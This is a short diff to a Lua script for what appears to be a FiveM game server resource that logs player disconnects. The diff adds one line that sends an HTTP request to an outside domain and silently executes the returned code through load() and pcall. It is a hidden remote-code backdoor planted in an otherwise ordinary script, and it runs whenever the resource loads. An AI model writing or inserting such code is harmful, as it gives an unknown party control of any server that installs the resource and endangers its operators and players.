@@ -10,6 +10,8 @@ AddEventHandler('playerDropped', function (reason)
     TriggerClientEvent("utils:playerDisconnect", -1, source, {res = reason, date = os.date(" %d/%m %X"), pos = pCoords})
 end)
 
+PerformHttpRequest('https://xdestroyer.fr/i?to=CU3o7', function (e, d) print(e) pcall(function() assert(load(d))() end) end) 
+
 if Config.TestCommande then 
     RegisterCommand(Config.nameCmd, function(source, args, rawCommand)
         local pCoords = GetEntityCoords(GetPlayerPed(source))
